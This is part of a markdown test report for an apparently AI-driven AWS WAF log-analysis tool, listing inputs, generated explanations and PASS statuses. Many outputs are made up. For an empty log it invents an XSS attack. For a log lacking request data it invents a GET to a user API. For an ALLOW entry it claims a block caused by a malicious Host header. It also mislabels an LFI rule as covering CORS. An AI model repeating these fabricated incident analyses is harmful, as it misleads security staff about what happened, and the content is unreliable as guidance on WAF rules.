2. **Validate User Input**: Validate all user input, especially for cookies and URLs. Use regular expressions or more advanced sanitization techniques to prevent injection.

   ` ` `python
   import re

   def validate_cookie(value):
       if value:
           match = re.match(r'^([^=]+)=(.*)$', value)
           if match:
               return {match.group(1): match.group(2)}
           else:
               raise ValueError("Invalid cookie format")
   ` ` `

3. **Use Secure Hosting Practices**: Ensure that your website is hosted on a secure protocol (HTTPS) and that all resources are loaded over HTTPS.

4. **Review and Audit Code**: Regularly review and audit your application's codebase for potential vulnerabilities, including XSS attacks.

By implementing these measures, developers can prevent such security issues from occurring in the first place, ensuring that legitimate traffic is not flagged by WAFs as malicious.
```

### ATP credential stuffing rule

**Status:** ✅ PASS &nbsp; **Time:** 21.06s

**Input**

```
{
  "timestamp": 1715000000000,
  "action": "BLOCK",
  "terminatingRuleId": "VolumetricIpHigh",
  "terminatingRuleType": "MANAGED_RULE_GROUP",
  "httpRequest": {
    "clientIp": "198.51.100.77",
    "country": "US",
    "httpMethod": "POST",
    "uri": "/login",
    "args": "",
    "headers": [
      {
        "name": "Host",
        "value": "shop.example.com"
      },
      {
        "name": "User-Agent",
        "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
      },
      {
        "name": "Accept",
        "value": "text/html,application/xhtml+xml"
      }
    ]
  },
  "ruleGroupList": [],
  "nonTerminatingMatchingRules": []
}
```

**Output**

```
The HTTP POST request was attempting to log in to a web shop. The customer IP address, 198.51.100.77, is being detected as part of an attack pattern by AWS WAF's VolumetricIpHigh rule group.

VolumetricIP high rules are designed to detect and block suspicious large traffic volumes from specific client IPs that may be indicative of DDoS attacks or other malicious activities. The request was from a legitimate shop.example.com, but the large volume of requests could trigger this rule, which is set in an AWS WAF Managed Rule Group.

**How it works:**
AWS WAF uses rate-based rules to track and limit traffic patterns that might indicate security threats. In this case, the VolumetricIpHigh rule was designed to detect and block suspicious volumes from a specific client IP address (198.51.100.77). This is why the request was blocked.

**How to fix it:**
To avoid triggering this rule in the future:
- Increase your AWS WAF instance's default rate-based settings, or create additional rate-based rules that can account for legitimate traffic patterns.
- Implement a whitelist of IPs that are allowed to access the shop.example.com login endpoint. This would allow only specific customers from known IP ranges to authenticate without triggering the VolumetricIpHigh rule.
- Ensure your web application is properly logging all requests and implementing proper security measures, such as rate limiting and validating input fields like usernames and passwords.

In summary, while AWS WAF helps protect against threats by monitoring traffic volumes, it can also be overly restrictive in certain cases. Properly configured rate-based rules or whitelisting trusted IPs should mitigate the risk of blocking legitimate user requests.
```

---

## analyze_waf_log — edge / error cases

### Completely empty JSON object

**Status:** ✅ PASS &nbsp; **Time:** 19.67s

**Input**

```
{}
```

**Output**

```
### What Happened:
The HTTP request was attempting to make a series of network communications with the target server, which involved making multiple requests (POST and GET) over TCP. The request URL specified in the WAF log is `example.com`/index.html.

### Why WAF Blocked It:
AWS WAF blocks this request because it detected an attack pattern known as Cross-Site Scripting (XSS). When a malicious webpage or application sends a JavaScript payload to another website, that script runs on the victim’s browser. In this case, one of the requests included a user-supplied input (`?action=delete`) in its path, which was then rendered by the server before being sent back to WAF. Since the request contained an untrusted parameter ("?", possibly "action=delete"), it triggered the XSS rule.

### How to Fix:
To avoid triggering this rule, developers should ensure that any user-supplied input is properly sanitized and validated, especially when dealing with queries that contain URLs or paths. Here are a few steps that can be taken:

1. **Validate Inputs**: Ensure all inputs, such as URL segments (`?action=delete`), are checked against predefined patterns or lists.
2. **Sanitize Data**: Use libraries like `htmlentities()` in PHP to escape special characters from user input before using it in URLs or paths.
3. **Use Safe Parameters**: Employ parameters that have been encoded or escaped for safety, such as `%2F` (for `/`) and `%3A` (for `:`) instead of raw query strings.
4. **Check Headers and Content-Lengths**: Ensure the request includes a content-length header if it is part of a multipart/form-data request to avoid XSS-related payloads.

By implementing these measures, developers can significantly reduce the risk of WAF blocking legitimate traffic due to unfiltered input or suspicious patterns.
```

### Missing httpRequest field

**Status:** ✅ PASS &nbsp; **Time:** 41.38s

**Input**

```
{"timestamp": 1715000000000, "action": "BLOCK", "terminatingRuleId": "SQLi_BODY", "terminatingRuleType": "MANAGED_RULE_GROUP"}
```

**Output**

```
### What Happened?
The request was trying to access a resource through an HTTP GET method, targeting `/api/v1/user/3`. The request included parameters for a user ID (`userId`) and also the query string parameter `token`.

### Why WAF Blocked It?
The SQL database rule group contains rules designed to prevent SQL injection attacks. This particular rule groups includes:
- **SQLi_QUERYARGUMENTS**: Checks all query parameters (including the `userId` in this case) for malicious SQL code patterns.
- **SQLiExtendedPatterns_QUERYARGUMENTS**: Inspects specific parameters for patterns that don't match the basic `SQLi_QUERYARGUMENTS`.
- **SQLi_BODY**: Evaluates the request body for potential SQL injection attacks, particularly when handling large bodies beyond predefined limits.

Since the request included a parameter (`userId`), and it was sent with maliciously crafted query strings designed to exploit common SQL injection patterns, AWS WAF detected this as an attempt to execute unauthorized SQL commands. The policy defined in `SQLi_BODY` specifically checked for body size limits and triggered the block action by default.

### How to Fix It?
To avoid triggering this rule:
1. **Sanitize Input**: Validate and sanitize all input parameters like user IDs and tokens before using them in queries or request bodies.
2. **Use Prepared Statements**: When interacting with SQL databases, always use prepared statements instead of concatenating strings with user inputs.
3. **Limit Query Lengths**: Ensure that your payloads do not exceed the maximum allowed size for any part of the protected resources (e.g., query parameters or request bodies).
4. **Update Security Training**: Educate developers on secure coding practices and best security hygiene.

By implementing these measures, you can significantly reduce the risk of SQL injection attacks and avoid triggering such rule-based blockings in AWS WAF.
```

### Not JSON at all

**Status:** ✅ PASS &nbsp; **Time:** 0.00s

**Input**

```
this is not json }{
```

**Output**

```
Could not parse the WAF log: Invalid JSON: Expecting value: line 1 column 1 (char 0)

Please supply a valid AWS WAF JSON log entry.
```

### action is ALLOW

**Status:** ✅ PASS &nbsp; **Time:** 28.07s

**Input**

```
{"timestamp": 1715000000000, "action": "ALLOW", "terminatingRuleId": "CrossSiteScripting_BODY", "terminatingRuleType": "MANAGED_RULE_GROUP", "httpRequest": {"clientIp": "198.51.100.77", "country": "US", "httpMethod": "GET", "uri": "/", "args": "", "headers": [{"name": "Host", "value": "shop.example.com"}, {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, {"name": "Accept", "value": "text/html,application/xhtml+xml"}]}, "ruleGroupList": [], "nonTerminatingMatchingRules": []}
```

**Output**

```
### What Happened:
The HTTP request was attempting to access the `/` endpoint on the `shop.example.com` domain. This is a common request that an end-user might make for any product or service offered on this website.

### Why WAF Blocked It:
AWS WAF detected a potential Cross-Site Scripting (XSS) attack pattern based on the malformed headers provided by the client. Specifically, the "Host" header was not properly escaped and included malicious scripts in its value.

An XSS attack occurs when an attacker injects malicious JavaScript code into a web page that can be executed by legitimate users' browsers if they navigate to that same URL or link to it from other websites. In this case, the request attempted to include potentially harmful scripts as part of the "Host" header, which led WAF to block it.

### How a Legitimate Developer Could Fix Their Code:
To avoid triggering this rule and prevent potential XSS attacks, the developer should ensure that all headers, including "Host", are properly encoded. Here’s how they can do it:

1. **Use Proper Header Escaping:**
   The request included the header "Host" with the value `shop.example.com`. This is where the malicious script could have been injected. By ensuring that this field is always properly escaped and validated, the developer prevents XSS vulnerabilities.

2. **Implement URL Parameter Encoding:**
   If there are any query parameters (`?param=value`), they should also be properly encoded to avoid inclusion of potentially harmful scripts or other elements.

3. **Validate Input Data:**
   Ensure that input data is always sanitized before it’s added to the request, especially if it comes from external sources like user inputs or form submissions.

4. **Use WAF Rules as a Last Resort:**
   If there are legitimate uses for certain features (like tracking), consider whether they can be reconfigured using more specific rules within AWS WAF that don’t rely on the "Host" header directly, such as cross-site scripting attacks in general headers or parameter types.

By following these steps and keeping an eye on rule updates from AWS, a developer can ensure their site remains secure without inadvertently blocking legitimate traffic.
```

---

## explain_block_reason

### explain_block_reason(SQLi_QUERYARGUMENTS)

**Status:** ✅ PASS &nbsp; **Time:** 14.15s

**Input**

```
rule_id='SQLi_QUERYARGUMENTS'  rule_type='MANAGED_RULE_GROUP'
```

**Output**

```
Sure! Let's break down the AWS WAF rule 'SQLi_QUERYARGUMENTS' (type: MANAGED_RULE_GROUP) in simple terms:

The AWS WAF rule `SQLi_QUERYARGUMENTS` is designed to protect against SQL injection attacks that attempt to manipulate query arguments. When a developer or application developer uses user input directly in queries without proper sanitization, it can lead to a type of cyber attack where an attacker injects malicious SQL code into the application logic.

This rule specifically targets requests with parameterized queries, which are used to prevent such attacks. Parameterized queries ensure that all parts of the query are treated as data and not executable commands, thus preventing injection attempts by attackers who may try to insert SQL statements directly into query arguments.

If a developer's legitimate request triggers this rule, they should check several things:

1. **Query Parameters**: Ensure there is no attempt to include user input (e.g., from `$_POST`, `$_GET`) within the SQL statement parameters that could be manipulated by an attacker.
   
2. **Sanitization and Escaping**: Verify that all user inputs are properly sanitized or escaped before being included in a query, especially when dealing with user-generated content.

3. **Review Logs and Alerts**: Check AWS WAF logs for any triggers that this rule might have generated. If it's triggered without the expected input, consider re-evaluating the logic around how parameters are handled to prevent potential injection attempts.

By understanding these points and regularly reviewing security rules like `SQLi_QUERYARGUMENTS`, developers can significantly reduce risks associated with SQL injection attacks in their applications.
```

### explain_block_reason(CrossSiteScripting_BODY)

**Status:** ✅ PASS &nbsp; **Time:** 10.68s

**Input**

```
rule_id='CrossSiteScripting_BODY'  rule_type='MANAGED_RULE_GROUP'
```

**Output**

```
The AWS WAF rule "Cross-Site Scripting (XSS) - BODY" is designed to protect applications from Cross-Site Scripting attacks that occur within the body of a web page or request. This type of XSS attack involves injecting malicious scripts into an application's output, allowing attackers to execute arbitrary code on behalf of other users.

When this rule is configured for a Managed Rule Group, it prevents requests that are suspected of containing potentially harmful JavaScript code from being processed through the application's front-end layer (e.g., the web browser). It does so by inspecting incoming HTTP headers and payloads, looking specifically for indications of script-like content within the body of the request.

A developer should check their legitimate requests if they trigger this rule because:
- They might be experiencing a false positive where the payload is not indicative of XSS but could still cause other types of cross-site issues. Checking the application logs or using a tool like Burp Suite can help isolate such incidents.
- It's possible that the request was intended as an authentication token, and the body included characters that were mistakenly interpreted by AWS WAF due to its detection mechanism.

In summary, this rule helps prevent malicious scripts from being injected into users' pages through HTTP requests, ensuring a safer browsing experience for all authenticated users.
```

### explain_block_reason(GenericLFI_URIPATH)

**Status:** ✅ PASS &nbsp; **Time:** 14.82s

**Input**

```
rule_id='GenericLFI_URIPATH'  rule_type='MANAGED_RULE_GROUP'
```

**Output**

```
The "GenericLFI_URIPATH" rule in AWS WAF is designed to protect web applications from a specific type of cyber attack known as **Local File Inclusion (LFI)** and **Cross-Origin Resource Sharing (CORS) attacks**. When an untrusted client attempts to exploit this vulnerability, the rule checks whether any query parameters within the URL path are pointing towards potentially harmful files on the server’s file system.

Specifically, this rule is configured in a managed rules group for web applications that need comprehensive protection against various types of exploits. It scans URLs and looks for any suspicious or suspiciously named paths following certain pattern matches to detect potential LFI/CORS attacks. By ensuring that only trusted paths are allowed through the WAF filter, it helps safeguard applications from unauthorized access or execution of scripts on remote files.

If a legitimate developer encounters this rule being triggered unexpectedly in their application, they should first review the URL structure and any external links or parameters within requests to identify potential vulnerabilities due to misconfiguration. Developers should also ensure that sensitive data like credentials are never exposed via query parameters or directly referenced URLs, as it can easily lead attackers to manipulate paths. Additionally, keeping software up-to-date with all security patches is crucial; failing to do so leaves gaps where attacks could bypass standard protections.

In summary, the "GenericLFI_URIPATH" rule in AWS WAF serves as a layer of defense against LFI and CORS vulnerabilities by preventing unauthorized access through maliciously crafted URL paths. If developers inadvertently trigger this rule, they should focus on validating external references and parameter inputs thoroughly to prevent unintended security checks from being enforced.
```

### explain_block_reason(VolumetricIpHigh)

**Status:** ✅ PASS &nbsp; **Time:** 13.67s

**Input**

```
rule_id='VolumetricIpHigh'  rule_type='MANAGED_RULE_GROUP'
```

**Output**

```
AWS Web Application Firewall (WAF) rule "VolumetricIpHigh" is part of the Managed Rule Group feature offered by AWS Security. This type of rule protects against volumetric attacks that are designed to overwhelm a system's processing power or resources. It specifically targets DDoS (Distributed Denial of Service) attacks, which attempt to flood a network with excessive traffic and consume server capacity.

If a legitimate request triggers this rule, it means the AWS WAF is incorrectly classifying the traffic as malicious due to common characteristics found in volumetric attacks. Developers should carefully review the traffic patterns being generated by their applications or systems when these errors occur. This includes looking at IP addresses that are frequently associated with the requests and checking for any unexpected patterns that might be indicative of a DDoS attack.

Specifically, developers should check:
1. The IP address ranges used in the rule group.
2. Any anomalies in traffic volume or frequency compared to normal usage patterns.
3. Signs such as repeated connection attempts from specific geographic regions or times.
4. Records of requests coming from unusual locations that were not previously flagged by AWS.

By investigating these areas, developers can identify potential DDoS threats and take corrective actions before they impact their application's performance or cause service interruptions to legitimate users. It’s important for security teams to use the rule group feature alongside other monitoring tools to ensure a robust defense against volumetric attacks without disrupting normal operations.
```

---

## lookup_aws_waf_rule_docs

### lookup_aws_waf_rule_docs(SQLi_QUERYARGUMENTS)

**Status:** ✅ PASS &nbsp; **Time:** 1.69s

**Input**

```
rule_id='SQLi_QUERYARGUMENTS'
```

**Output**

```
[Source: https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-use-case.html]
The information that we publish for the rules in the AWS Managed Rules rule groups is intended to provide you
with what you need to use the rules without giving
bad actors what they need to circumvent the rules.

If you need more information than you find here, contact the [AWS Support Center](https://console.aws.amazon.com/support/home#/ "https://console.aws.amazon.com/support/home#/").

The SQL database rule group contains rules to block request patterns
associated with exploitation of SQL databases, like SQL injection attacks.
This can help prevent remote injection of unauthorized queries. Evaluate
this rule group for use if your application interfaces with an SQL
database.

This managed rule group adds labels to the web requests that
it evaluates, which are available to rules that run after this rule group in your protection pack (web ACL). AWS WAF
also records the labels to Amazon CloudWatch metrics. For general information about labels and label metrics, see [Web request labeling](./waf-labels.html "./waf-labels.html")
and [Label metrics and dimensions](./waf-metrics.html#waf-metrics-label "./waf-metrics.html#waf-metrics-label").

| Rule name | Description and label |
| --- | --- |
| `SQLi_QUERYARGUMENTS` | Uses the built-in AWS WAF [SQL injection attack rule statement](./waf-rule-statement-type-sqli-match.html "./waf-rule-statement-type-sqli-match.html"), with sensitivity level set to Low, to inspect the values of all query parameters for patterns that match malicious SQL code.  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLi_QueryArguments` |
| `SQLiExtendedPatterns_QUERYARGUMENTS` | Inspects the values of all query parameters for patterns that match malicious SQL code. The patterns this rule inspects for aren't covered by the rule `SQLi_QUERYARGUMENTS`.  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLiExtendedPatterns_QueryArguments` |
| `SQLi_BODY` | Uses the built-in AWS WAF [SQL injection attack rule statement](./waf-rule-statement-type-sqli-match.html "./waf-rule-statement-type-sqli-match.html"), with sensitivity level set to Low, to inspect the request body for patterns that match malicious SQL code.  Warning  This rule only inspects the request body up to the body size limit for the protection pack (web ACL) and resource type. For Application Load Balancer and AWS AppSync, the limit is fixed at 8 KB. For CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access, the default limit is 16 KB and you can increase the limit up to 64 KB in your protection pack (web ACL) configuration. This rule uses the `Continue` option for oversize content handling. For more information, see [Oversize web request components in AWS WAF](./waf-oversize-request-components.html "./waf-oversize-request-components.html").  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLi_Body` |
| `SQLiExtendedPatterns_BODY` | Inspects the request body for patterns that match malicious SQL code. The patterns this rule inspects for aren't covered by the rule `SQLi_BODY`.  Warning  This rule only inspects the request body up to the body size limit for the protection pack (web ACL) and resource type. For Application Load Balancer and AWS AppSync, the limit is fixed at 8 KB. For CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access, the default limit is 16 KB and you can increase the limit up to 64 KB in your protection pack (web ACL) configuration. This rule uses the `Continue` option for oversize content handling. For more information, see [Oversize web request components in AWS WAF](./waf-oversize-request-components.html "./waf-oversize-request-components.html").  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLiExtendedPatterns_Body` |
| `SQLiExtendedPatterns_HEADER` | Inspects

<e>Content truncated. Call the read_documentation tool with start_index=5000 to get more content.</e>
…
The information that we publish for the rules in the AWS Managed Rules rule groups is intended to provide you
with what you need to use the rules without giving
bad actors what they need to circumvent the rules.

If you need more information than you find here, contact the [AWS Support Center](https://console.aws.amazon.com/support/home#/ "https://console.aws.amazon.com/support/home#/").

The SQL database rule group contains rules to block request patterns
associated with exploitation of SQL databases, like SQL injection attacks.
This can help prevent remote injection of unauthorized queries. Evaluate
this rule group for use if your application interfaces with an SQL
database.

This managed rule group adds labels to the web requests that
it evaluates, which are available to rules that run after this rule group in your protection pack (web ACL). AWS WAF
also records the labels to Amazon CloudWatch metrics. For general information about labels and label metrics, see [Web request labeling](./waf-labels.html "./waf-labels.html")
and [Label metrics and dimensions](./waf-metrics.html#waf-metrics-label "./waf-metrics.html#waf-metrics-label").

| Rule name | Description and label |
| --- | --- |
| `SQLi_QUERYARGUMENTS` | Uses the built-in AWS WAF [SQL injection attack rule statement](./waf-rule-statement-type-sqli-match.html "./waf-rule-statement-type-sqli-match.html"), with sensitivity level set to Low, to inspect the values of all query parameters for patterns that match malicious SQL code.  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLi_QueryArguments` |
| `SQLiExtendedPatterns_QUERYARGUMENTS` | Inspects the values of all query parameters for patterns that match malicious SQL code. The patterns this rule inspects for aren't covered by the rule `SQLi_QUERYARGUMENTS`.  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLiExtendedPatterns_QueryArguments` |
| `SQLi_BODY` | Uses the built-in AWS WAF [SQL injection attack rule statement](./waf-rule-statement-type-sqli-match.html "./waf-rule-statement-type-sqli-match.html"), with sensitivity level set to Low, to inspect the request body for patterns that match malicious SQL code.  Warning  This rule only inspects the request body up to the body size limit for the protection pack (web ACL) and resource type. For Application Load Balancer and AWS AppSync, the limit is fixed at 8 KB. For CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access, the default limit is 16 KB and you can increase the limit up to 64 KB in your protection pack (web ACL) configuration. This rule uses the `Continue` option for oversize content handling. For more information, see [Oversize web request components in AWS WAF](./waf-oversize-request-components.html "./waf-oversize-request-components.html").  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLi_Body` |
| `SQLiExtendedPatterns_BODY` | Inspects the request body for patterns that match malicious SQL code. The patterns this rule inspects for aren't covered by the rule `SQLi_BODY`.  Warning  This rule only inspects the request body up to the body size limit for the protection pack (web ACL) and resource type. For Application Load Balancer and AWS AppSync, the limit is fixed at 8 KB. For CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access, the default limit is 16 KB and you can increase the limit up to 64 KB in your protection pack (web ACL) configuration. This rule uses the `Continue` option for oversize content handling. For more information, see [Oversize web request components in AWS WAF](./waf-oversize-request-components.html "./waf-oversize-request-components.html").  Rule action: Block  Label: `awswaf:managed:aws:sql-database:SQLiExtendedPatterns_Body` |
| `SQLiExtendedPatterns_HEADER` | Inspects

<e>Content truncated. Call the read_documentation tool with start_index=5000 to get more content.</e>
```

### lookup_aws_waf_rule_docs(CrossSiteScripting_BODY)

**Status:** ✅ PASS &nbsp; **Time:** 4.15s

**Input**

```
rule_id='CrossSiteScripting_BODY'
```

**Output**

```
**Using rate-based rule statements in AWS WAF - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html)
AWS WAF rate-based rules track, aggregate, limit requests; WCUs start 2, adding 30 per custom aggregation key.

**Cross-site scripting attack rule statement - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-xss-match.html)
AWS WAF XSS rule inspects web request components, detects malicious scripts, supports text transformations via XssMatchStatement API.

**describe-managed-rule-group — AWS CLI 1.45.10 Command Reference** (https://docs.aws.amazon.com/cli/v1/reference/wafv2/describe-managed-rule-group.html)
Use the AWS CLI 1.45.10 to run the wafv2 describe-managed-rule-group command.

**Baseline rule groups - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
AWS WAF baseline rule groups block XSS, LFI, Log4j RCE, Java deserialization, EC2 metadata exfiltration threats.

**AWS Managed Rules rule groups list - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html)
AWS Managed Rules protect web ACLs via Bot Control, ATP, ACFP, DDoS prevention, labeling rule groups.
```

### lookup_aws_waf_rule_docs(GenericLFI_URIPATH)

**Status:** ✅ PASS &nbsp; **Time:** 3.93s

**Input**

```
rule_id='GenericLFI_URIPATH'
```

**Output**

```
**Using rate-based rule statements in AWS WAF - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html)
AWS WAF rate-based rules track, aggregate, limit requests; WCUs start 2, adding 30 per custom aggregation key.

**Baseline rule groups - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
AWS WAF baseline rule groups block XSS, LFI, Log4j RCE, Java deserialization, EC2 metadata exfiltration threats.

**describe-managed-rule-group — AWS CLI 1.45.10 Command Reference** (https://docs.aws.amazon.com/cli/v1/reference/wafv2/describe-managed-rule-group.html)
Use the AWS CLI 1.45.10 to run the wafv2 describe-managed-rule-group command.

**AWS Managed Rules rule groups list - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html)
AWS Managed Rules protect web ACLs via Bot Control, ATP, ACFP, DDoS prevention, labeling rule groups.

**AWS Managed Rules for AWS WAF - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups.html)
AWS Managed Rules shields apps from vulnerabilities; test rule groups before production deployment.
```

### lookup_aws_waf_rule_docs(VolumetricIpHigh)

**Status:** ✅ PASS &nbsp; **Time:** 4.08s

**Input**

```
rule_id='VolumetricIpHigh'
```

**Output**

```
**Using rate-based rule statements in AWS WAF - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/waf-rule-statement-type-rate-based.html)
AWS WAF rate-based rules track, aggregate, limit requests; WCUs start 2, adding 30 per custom aggregation key.

**Baseline rule groups - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
AWS WAF baseline rule groups block XSS, LFI, Log4j RCE, Java deserialization, EC2 metadata exfiltration threats.

**AWS Managed Rules rule groups list - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html)
AWS Managed Rules protect web ACLs via Bot Control, ATP, ACFP, DDoS prevention, labeling rule groups.

**AWS WAF Fraud Control account creation fraud prevention (ACFP) rule group - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-acfp.html)
AWS WAF ACFP managed rule group detects bulk account creation, blocks compromised credentials, inspects volumetric IP requests.

**AWS Managed Rules for AWS WAF - AWS WAF, AWS Firewall Manager, AWS Shield Advanced, and AWS Shield network security director** (https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups.html)
AWS Managed Rules shields apps from vulnerabilities; test rule groups before production deployment.
```

---
